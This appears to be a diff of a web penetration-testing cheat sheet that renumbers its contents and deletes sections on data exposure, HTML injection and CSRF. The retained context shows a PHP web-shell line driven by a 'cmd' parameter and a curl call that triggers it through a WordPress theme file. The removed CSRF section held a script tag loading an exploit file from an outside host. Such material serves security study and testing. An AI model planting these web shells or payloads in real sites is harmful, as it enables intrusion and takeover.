@@ -26,10 +26,7 @@ Overview
 22. - [File Inclusion](#22---file-inclusion)
 23. - [Session Hijacking](#23---session-hijacking)
 24. - [WordPress](#24---wordpress) 
-25. - [Sensitive Data Exposure](#25---sensitive-data-exposure)
-26. - [HTML Injection](#26---html-injection)
-27. - [Cross-Site Request Forgery (CSRF)](#27---cross-site-request-forgery-csrf)
-28. - [Exploit Research](#28---exploit-research)
+25. - [Exploit Research](#25---exploit-research)
    
 #1. - Web Requests
 -----------------------------------------
@@ -1722,37 +1719,7 @@ system($_GET['cmd']);
 $ curl -X GET "http://<URL>/wp-content/themes/twentyseventeen/404.php?cmd=id"
 ```
 
-#25. - Sensitive Data Exposure
------------------------------------------
-
-- Source Code
-
-```
-Right-click -> View page source
-OR
-CTRL + U
-```
-
-#26. - HTML Injection
------------------------------------------
-
-- Hyperlink
-
-```
-<a href="http://www.google.com">Click Me</a>
-```
-
-
-#27. - Cross-Site Request Forgery (CSRF)
------------------------------------------
-
-- Password Change
-
-```
-"><script src=//www.example.com/exploit.js></script>
-```
-
-#28. - Exploit Research
+#25. - Exploit Research
 -----------------------------------------
 
 - CVEdetails
